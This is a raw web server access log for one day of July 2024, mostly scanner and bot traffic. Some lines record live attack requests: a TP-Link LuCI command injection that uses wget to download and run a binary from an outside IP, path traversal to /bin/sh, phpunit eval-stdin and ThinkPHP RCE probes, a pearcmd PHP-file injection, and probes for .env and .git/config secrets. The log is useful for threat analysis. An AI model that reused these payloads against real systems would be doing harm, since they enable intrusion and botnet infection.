83.97.73.245 - - [07/Jul/2024:01:29:17 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.191.126.213 - - [07/Jul/2024:02:03:57 +0000] "GET / HTTP/1.1" 200 2659 "-" "-"
141.98.83.197 - - [07/Jul/2024:02:06:47 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.224.128.43 - - [07/Jul/2024:02:14:27 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.66 - - [07/Jul/2024:02:32:42 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
83.97.73.245 - - [07/Jul/2024:02:33:28 +0000] "GET /actuator/gateway/routes HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.148.10.251 - - [07/Jul/2024:02:34:34 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.191.126.213 - - [07/Jul/2024:02:39:59 +0000] "GET / HTTP/1.1" 200 2659 "-" "-"
46.19.143.66 - - [07/Jul/2024:03:46:21 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
216.218.206.69 - - [07/Jul/2024:03:47:39 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
216.218.206.69 - - [07/Jul/2024:03:49:11 +0000] "GET /webui/ HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.6099.28 Safari/537.36"
216.218.206.69 - - [07/Jul/2024:03:50:37 +0000] "GET /favicon.ico HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
216.218.206.69 - - [07/Jul/2024:03:51:01 +0000] "GET /geoserver/web/ HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
185.191.126.213 - - [07/Jul/2024:04:11:04 +0000] "GET / HTTP/1.1" 200 2659 "-" "-"
104.198.5.83 - - [07/Jul/2024:04:16:13 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
104.198.5.83 - - [07/Jul/2024:04:16:14 +0000] "GET /favicon.ico HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
179.43.161.135 - - [07/Jul/2024:04:21:27 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
205.210.31.212 - - [07/Jul/2024:04:30:16 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xC9\x9F\xCBd\xC2\xEC\xA4Ud`\xF3\xE7\x07R\x0B9.\xBD\x89\xD0\xCC)\xE9\xD6\x05\xD5]?\xF9C\xF9k\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 154 "-" "-"
205.210.31.212 - - [07/Jul/2024:04:30:16 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03W(\xA1\x22E\xBA\xE9@\xCB\x8CD}\x22sY\x8Dj\x9A\xF0\xFC9/\xEB\xF3;\xDB-\xA5\xD8\x8C\xAEl \x82\xEA\xC3\xEA5d\x09\xCD\xDE\x98\x8B\x22\x18Z4h\x85" 400 154 "-" "-"
141.98.83.197 - - [07/Jul/2024:04:39:11 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
141.98.83.197 - - [07/Jul/2024:04:39:11 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
185.150.26.246 - - [07/Jul/2024:04:45:50 +0000] "GET / HTTP/1.1" 200 2659 "-" "-"
46.19.143.66 - - [07/Jul/2024:04:59:31 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
138.68.175.62 - - [07/Jul/2024:05:08:00 +0000] "\x16\x03\x01\x01\xFD\x01\x00\x01\xF9\x03\x03\x0B\xFD>\xA1\xBEC\xA2\xA5" 400 154 "-" "-"
147.185.132.126 - - [07/Jul/2024:05:11:37 +0000] "GET / HTTP/1.0" 200 2659 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
45.148.10.251 - - [07/Jul/2024:05:52:02 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.66 - - [07/Jul/2024:06:12:33 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
141.98.83.197 - - [07/Jul/2024:06:20:10 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.249.48.202 - - [07/Jul/2024:06:27:25 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
64.62.197.198 - - [07/Jul/2024:06:57:55 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xF1\xE0_\xDBA\x8B\xA9/\x0E\xD8\x97\xB6#\x1C\x9Ahz\x7F=4_pAvS\xDC'1\x91\xDD\xC4\x5C\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
185.191.126.213 - - [07/Jul/2024:07:04:30 +0000] "GET / HTTP/1.1" 200 2659 "-" "-"
141.98.83.197 - - [07/Jul/2024:07:07:34 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
94.156.68.162 - - [07/Jul/2024:07:10:57 +0000] "GET /.env HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
94.156.68.162 - - [07/Jul/2024:07:11:09 +0000] "GET /.env HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
46.19.143.66 - - [07/Jul/2024:07:26:05 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
185.191.126.213 - - [07/Jul/2024:07:34:19 +0000] "GET / HTTP/1.1" 200 2659 "-" "-"
106.75.137.241 - - [07/Jul/2024:07:51:08 +0000] "GET /.vscode/sftp.json HTTP/1.1" 200 1054 "-" "Go-http-client/1.1"
141.98.83.197 - - [07/Jul/2024:07:52:26 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
51.8.223.97 - - [07/Jul/2024:08:00:29 +0000] "GET /portal/redlion HTTP/1.1" 200 1054 "-" "Mozilla/5.0 zgrab/0.x"
45.148.10.251 - - [07/Jul/2024:08:01:00 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.224.128.43 - - [07/Jul/2024:08:06:45 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.191.126.213 - - [07/Jul/2024:08:10:24 +0000] "GET / HTTP/1.1" 200 2659 "-" "-"
46.19.143.66 - - [07/Jul/2024:08:38:48 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
106.75.133.175 - - [07/Jul/2024:08:47:33 +0000] "GET /.git/config HTTP/1.1" 200 1054 "-" "Go-http-client/1.1"
141.98.83.197 - - [07/Jul/2024:09:00:15 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.92.244.183 - - [07/Jul/2024:09:17:55 +0000] "GET /.git/config HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
45.148.10.251 - - [07/Jul/2024:09:23:04 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.42.75.68 - - [07/Jul/2024:09:28:23 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 154 "-" "-"
5.42.75.68 - - [07/Jul/2024:09:28:24 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 154 "-" "-"
5.42.75.68 - - [07/Jul/2024:09:28:24 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:24 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:25 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:25 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:25 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:26 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:26 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:27 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:28 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:29 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:29 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:29 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:30 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:30 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:32 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:33 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:33 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:33 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:34 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:34 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:38 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:38 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:38 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:39 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:40 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:40 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:40 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:41 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:41 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:42 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:42 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:42 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:42 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:43 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:43 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:43 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:44 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:44 +0000] "GET /index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:45 +0000] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:45 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
5.42.75.68 - - [07/Jul/2024:09:28:46 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 200 2659 "-" "Custom-AsyncHttpClient"
185.150.26.251 - - [07/Jul/2024:09:35:22 +0000] "GET / HTTP/1.1" 200 2659 "-" "-"
141.98.83.197 - - [07/Jul/2024:09:40:09 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
194.165.16.10 - - [07/Jul/2024:09:40:18 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
45.148.10.251 - - [07/Jul/2024:09:45:23 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.66 - - [07/Jul/2024:09:52:59 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
91.92.249.227 - - [07/Jul/2024:10:28:36 +0000] "GET /.git/config HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)"
84.54.51.43 - - [07/Jul/2024:10:53:16 +0000] "GET /.env HTTP/1.1" 200 2659 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
46.19.143.66 - - [07/Jul/2024:11:04:57 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
185.191.126.213 - - [07/Jul/2024:11:17:24 +0000] "GET / HTTP/1.1" 200 2659 "-" "-"
162.216.149.106 - - [07/Jul/2024:11:23:16 +0000] "GET / HTTP/1.1" 200 1054 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
52.160.37.97 - - [07/Jul/2024:11:26:00 +0000] "MGLNDD_103.179.33.152_80" 400 154 "-" "-"
185.191.126.213 - - [07/Jul/2024:11:58:03 +0000] "GET / HTTP/1.1" 200 2659 "-" "-"
141.98.83.197 - - [07/Jul/2024:12:10:32 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.66 - - [07/Jul/2024:12:20:14 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
92.249.48.202 - - [07/Jul/2024:12:36:56 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.66 - - [07/Jul/2024:13:33:40 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
141.98.83.197 - - [07/Jul/2024:13:34:41 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.148.10.251 - - [07/Jul/2024:13:52:01 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.66 - - [07/Jul/2024:14:45:36 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
87.236.176.197 - - [07/Jul/2024:14:47:22 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
185.191.126.213 - - [07/Jul/2024:15:06:02 +0000] "GET / HTTP/1.1" 200 2659 "-" "-"
84.54.51.43 - - [07/Jul/2024:15:19:12 +0000] "GET /.env HTTP/1.1" 200 2659 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
172.206.142.54 - - [07/Jul/2024:15:42:45 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 zgrab/0.x"
46.19.143.66 - - [07/Jul/2024:16:00:29 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
141.98.83.197 - - [07/Jul/2024:16:28:04 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
141.98.83.197 - - [07/Jul/2024:16:28:05 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 200 2659 "-" "Go-http-client/1.1"
51.254.59.113 - - [07/Jul/2024:16:32:40 +0000] "GET / HTTP/1.1" 200 2659 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
54.81.226.219 - - [07/Jul/2024:17:04:38 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
54.81.226.219 - - [07/Jul/2024:17:04:38 +0000] "GET /favicon.ico HTTP/1.1" 200 1054 "http://103.179.33.152/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
34.76.158.233 - - [07/Jul/2024:17:11:04 +0000] "GET / HTTP/1.1" 200 1054 "-" "python-requests/2.32.2"
46.19.143.66 - - [07/Jul/2024:17:14:13 +0000] "GET / HTTP/1.1" 200 2659 "-" "Hello World/1.0"
45.148.10.251 - - [07/Jul/2024:17:17:02 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.92.244.183 - - [07/Jul/2024:17:19:10 +0000] "GET /.git/config HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3800.0 Iron Safari/537.36"
92.249.48.202 - - [07/Jul/2024:17:36:28 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
94.156.68.162 - - [07/Jul/2024:17:37:15 +0000] "GET /_profiler/phpinfo HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (X11; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0"
94.156.68.162 - - [07/Jul/2024:17:37:20 +0000] "GET /_profiler/phpinfo HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (X11; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0"
141.98.83.197 - - [07/Jul/2024:17:43:40 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.174.191.31 - - [07/Jul/2024:17:56:33 +0000] "GET / HTTP/1.0" 200 2659 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
185.224.128.43 - - [07/Jul/2024:18:07:01 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [07/Jul/2024:19:05:05 +0000] "GET / HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.78 - - [07/Jul/2024:19:30:18 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xC3\xC6y\x1E5\xA8\xEA\xA8\x19*\x00\x1F\xA7\x93c\x94S\xE1\x96~\x04\xBD\xB4\x10\xE2\x17^\xF1\x0F" 400 154 "-" "-"
